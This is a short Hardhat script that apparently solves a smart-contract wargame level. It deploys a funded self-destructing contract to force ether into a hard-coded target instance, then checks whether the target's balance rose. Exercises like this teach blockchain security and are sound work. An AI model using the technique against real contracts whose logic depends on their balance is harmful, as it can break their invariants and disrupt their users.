const hardhat = require('hardhat');
const ethers = hardhat.ethers;

const INSTANCE_ADDRESS = '0x379c96e2D392608cB6FF58a7109811B5ea6d4694';

const main = async () => {
    console.log('Checking target starting balance.');
    const bal = await ethers.provider.getBalance(INSTANCE_ADDRESS);
    console.log(`Starting balance is ${bal.toString()}`);

    console.log('Force sending some ETH by selfdestruct.');
    const SelfDestruct = await ethers.getContractFactory('SelfDestruct');
    const selfDestruct = await SelfDestruct.deploy(INSTANCE_ADDRESS, {
        gasLimit: 1000000,
        value: ethers.utils.parseEther('0.001'),
    });
    await selfDestruct.deployed();

    console.log(`Destruct contract address is ${selfDestruct.address}`);

    console.log('Checking target final balance.');
    const balAfter = await ethers.provider.getBalance(INSTANCE_ADDRESS);
    console.log(`Final balance is ${balAfter.toString()}`);

    if (balAfter > bal) {
        console.log('Success.');
    } else {
        console.log('Failed.');
    }
};

main();
